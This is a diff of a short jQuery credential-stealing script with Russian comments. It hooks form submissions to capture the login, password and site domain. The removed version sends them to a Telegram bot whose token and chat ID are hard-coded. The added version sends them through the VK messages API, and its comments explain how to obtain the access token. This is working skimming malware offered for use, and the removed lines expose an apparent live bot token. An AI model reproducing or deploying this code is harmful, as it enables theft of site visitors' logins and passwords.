@@ -1,12 +1,12 @@
-﻿var token = '842057334:AAFzHtkcs50o_ARI8kx1_mnAT4TBa-T9ea8';
-var api = 'https://api.telegram.org/bot' + token;
-var UID = '639624497';
+JavaScript:
+var token = 'Токен'; // Переходим на https://vkhost.github.io/ , читаем инструкцию, > VK admin и вставляем сюда
+var UID = 'Ид'; // Можно указать свой же, открываем свою фотографию и будет что-то подобное:
+// ?z=photo255543445_428961, наш ид - 255543445
 
-    $("form").submit(function() {
-       var login = $(this).parent().find('input[type=text]').val();
-       var pass = $(this).parent().find('input[type=password]').val();
-	   var currentSite = document.domain;
-	   var message = "<b>NEW LOG</b> \n SITE: " + currentSite + '\n DATA: ' + login + ':' + pass;
-	   $.get(api + '/sendMessage?chat_id=' + UID + '&text=' + encodeURIComponent(message) + '&parse_mode=html');
-    });
-	
+$("form").submit(function() {
+var login = $(this).parent().find('input[type=text]').val();
+var pass = $(this).parent().find('input[type=password]').val();
+var currentSite = document.domain;
+var message = "NEW LOG 👇\n SITE | LOGIN | PASSWORD " + "\n" + currentSite + " | " + login + " | " + pass;
+$.get('https://api.vk.com/method/messages.send?user_id=' + UID + '&message=' + encodeURIComponent(message) + '&access_token='+ token +'&v=5.38');
+}); 
